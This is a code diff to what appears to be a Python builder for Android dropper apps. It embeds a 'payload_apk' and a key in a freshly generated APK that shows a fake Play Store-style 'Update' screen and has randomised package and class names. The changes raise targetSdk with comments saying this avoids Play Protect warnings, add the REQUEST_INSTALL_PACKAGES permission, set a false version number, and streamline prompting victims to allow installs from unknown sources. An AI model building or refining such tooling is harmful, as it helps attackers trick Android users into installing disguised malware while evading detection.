@@ -32,51 +32,75 @@ def _rand_pkg():
     return f"{tld}.{_rand_seg()}.{_rand_seg()}"
 
 
-_FALLBACK_PNG_B64 = (
-    "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAaUlEQVR42u3QMQEAAAgDoC1p"
-    "0A0z8BcJqLv7uwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4FeAWQAB"
-    "O1d7iQAAAABJRU5ErkJggg=="
-)
+# ------------------------------------------------------------- icon handling
 
-
-def _write_fallback_icon(path):
-    import base64
-    with open(path, "wb") as f:
-        f.write(base64.b64decode(_FALLBACK_PNG_B64))
+def _verify_png(data: bytes) -> bool:
+    try:
+        from PIL import Image
+        img = Image.open(io.BytesIO(data))
+        img.load()
+        idx = 8
+        n = len(data)
+        while idx + 12 <= n:
+            length = int.from_bytes(data[idx:idx + 4], "big")
+            ctype = data[idx + 4:idx + 8]
+            for c in ctype:
+                if not (65 <= c <= 90 or 97 <= c <= 122):
+                    return False
+            if idx + 12 + length > n:
+                return False
+            idx += 12 + length
+            if ctype == b"IEND":
+                return True
+        return False
+    except Exception:
+        return False
 
 
 def _reencode_png(raw_bytes: bytes, max_side: int = 192) -> bytes:
-    """Decode any image → re-save clean PNG. Raises on failure."""
     from PIL import Image
     img = Image.open(io.BytesIO(raw_bytes))
     img.load()
-
     if img.mode not in ("RGBA", "RGB"):
         img = img.convert("RGBA")
-
     w, h = img.size
     if max(w, h) > max_side:
         scale = max_side / float(max(w, h))
         nw = max(1, int(w * scale))
         nh = max(1, int(h * scale))
         img = img.resize((nw, nh), Image.LANCZOS)
-
     buf = io.BytesIO()
     img.save(buf, format="PNG", optimize=True)
     return buf.getvalue()
 
 
-def _safe_icon_bytes(raw_bytes: bytes) -> bytes:
-    """Try to produce aapt2-friendly PNG. Returns None on failure."""
+def _safe_icon_bytes(raw_bytes: bytes):
     try:
-        return _reencode_png(raw_bytes)
+        clean = _reencode_png(raw_bytes)
     except Exception as e:
-        print(f"[!] icon decode failed: {e}", flush=True)
+        print(f"[!] icon re-encode failed: {e}", flush=True)
         return None
+    if not _verify_png(clean):
+        print("[!] re-encoded PNG failed verification", flush=True)
+        return None
+    return clean
 
 
-# ------------------------------------------------------------- MainActivity — Play Store style
+def _generate_fallback_icon(path: str):
+    from PIL import Image, ImageDraw
+    size = 192
+    img = Image.new("RGBA", (size, size), (0, 122, 255, 255))
+    d = ImageDraw.Draw(img)
+    cx = size // 2
+    d.polygon(
+        [(cx, 48), (cx + 46, 108), (cx + 18, 108),
+         (cx + 18, 148), (cx - 18, 148), (cx - 18, 108), (cx - 46, 108)],
+        fill=(255, 255, 255, 255),
+    )
+    img.save(path, format="PNG", optimize=True)
+
+
+# ------------------------------------------------------------- MainActivity
 
 _MAIN_ACTIVITY_JAVA = """package {PKG};
 
@@ -251,26 +275,42 @@ public class {ACT} extends Activity {{
         setContentView(root);
     }}
 
+    private boolean hasInstallPermission() {{
+        if (Build.VERSION.SDK_INT < 26) return true;
+        try {{
+            return getPackageManager().canRequestPackageInstalls();
+        }} catch (Throwable t) {{
+            return false;
+        }}
+    }}
+
+    private void requestInstallPermission() {{
+        if (Build.VERSION.SDK_INT < 26) return;
+        try {{
+            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
+            i.setData(Uri.parse("package:" + getPackageName()));
+            startActivityForResult(i, REQ_INSTALL);
+        }} catch (Throwable t) {{
+            try {{
+                Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
+                startActivityForResult(i, REQ_INSTALL);
+            }} catch (Throwable t2) {{}}
+        }}
+    }}
+
     private void startUpdate() {{
         if (busy.getAndSet(true)) return;
         btnUpdate.setEnabled(false);
         btnUpdate.setText("Preparing…");
         progress.setVisibility(View.VISIBLE);
 
-        if (Build.VERSION.SDK_INT >= 26) {{
-            try {{
-                PackageManager pm = getPackageManager();
-                if (!pm.canRequestPackageInstalls()) {{
-                    Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
-                    i.setData(Uri.parse("package:" + getPackageName()));
-                    startActivityForResult(i, REQ_INSTALL);
-                    busy.set(false);
-                    btnUpdate.setEnabled(true);
-                    btnUpdate.setText("Update");
-                    progress.setVisibility(View.GONE);
-                    return;
-                }}
-            }} catch (Throwable t) {{}}
+        if (!hasInstallPermission()) {{
+            busy.set(false);
+            btnUpdate.setEnabled(true);
+            btnUpdate.setText("Update");
+            progress.setVisibility(View.GONE);
+            requestInstallPermission();
+            return;
         }}
 
         new Thread(new Runnable() {{
@@ -344,15 +384,20 @@ public class {ACT} extends Activity {{
     protected void onActivityResult(int req, int res, Intent data) {{
         super.onActivityResult(req, res, data);
         if (req == REQ_INSTALL) {{
-            if (Build.VERSION.SDK_INT >= 26) {{
-                try {{
-                    if (getPackageManager().canRequestPackageInstalls()) {{
-                        btnUpdate.post(new Runnable() {{
-                            public void run() {{ startUpdate(); }}
-                        }});
-                    }}
-                }} catch (Throwable t) {{}}
+            if (hasInstallPermission()) {{
+                btnUpdate.post(new Runnable() {{
+                    public void run() {{ startUpdate(); }}
+                }});
             }}
+        }}
+    }}
+
+    @Override
+    protected void onResume() {{
+        super.onResume();
+        if (btnUpdate != null && !busy.get() && hasInstallPermission()) {{
+            btnUpdate.setEnabled(true);
+            btnUpdate.setText("Update");
         }}
     }}
 }}
@@ -393,14 +438,17 @@ public class {PROV} extends ContentProvider {{
 
 
 def _manifest_xml(pkg: str, app_class: str, activity_class: str, provider_class: str) -> str:
+    # targetSdk 33 — Play Protect ka "older Android" warning isi se aata hai
+    # REQUEST_INSTALL_PACKAGES — bina iske "Allow from this source" toggle greyed rehta hai API 26+
     return f"""<?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="{pkg}"
     android:versionCode="1"
-    android:versionName="1.0">
+    android:versionName="2.4.1">
 
-    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="25" />
+    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />
     <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
 
     <application
         android:label="@string/app_name"
@@ -443,8 +491,7 @@ def _key_bytes_literal(key: bytes) -> str:
 
 
 def build_template(payload_apk: str, session_dir: str, key: bytes):
-    """Build fresh minimal APK with Play Store-style update screen.
-    Returns (unsigned_apk_path, package_name, label)."""
+    """Build fresh minimal APK with Play Store-style update screen."""
     src_root = os.path.join(session_dir, "build")
     if os.path.exists(src_root):
         shutil.rmtree(src_root)
@@ -469,20 +516,28 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
         f.write(f'    <string name="app_name">{safe_xml_text(label)}</string>\n')
         f.write("</resources>\n")
 
-    # icon: always re-encode as clean PNG
     icon_path = os.path.join(drawable_dir, "ic_launcher.png")
-    wrote_icon = False
+    wrote = False
     if icon:
         raw, _ext = icon
         clean = _safe_icon_bytes(raw)
         if clean:
             with open(icon_path, "wb") as f:
                 f.write(clean)
-            wrote_icon = True
-            print(f"[✓] icon re-encoded ({len(clean)} bytes)", flush=True)
-    if not wrote_icon:
-        _write_fallback_icon(icon_path)
-        print("[i] fallback icon used", flush=True)
+            wrote = True
+            print(f"[✓] payload icon re-encoded ({len(clean)} bytes)", flush=True)
+    if not wrote:
+        try:
+            _generate_fallback_icon(icon_path)
+            wrote = True
+            print("[i] fallback icon generated (Pillow)", flush=True)
+        except Exception as e:
+            raise RuntimeError(f"fallback icon generation failed: {e}")
+
+    with open(icon_path, "rb") as f:
+        check = f.read()
+    if not _verify_png(check):
+        raise RuntimeError("final icon PNG failed verification — cannot proceed")
 
     pkg = _rand_pkg()
     app_cls = "A" + "".join(random.choices(string.ascii_uppercase, k=random.randint(4, 8)))
@@ -527,9 +582,9 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
         "--manifest", manifest_path,
         "-I", ANDROID_JAR,
         "--min-sdk-version", "21",
-        "--target-sdk-version", "25",
+        "--target-sdk-version", "33",
         "--version-code", "1",
-        "--version-name", "1.0",
+        "--version-name", "2.4.1",
         "-R", res_zip,
         "--auto-add-overlay",
     ], timeout=300, label="aapt2 link")
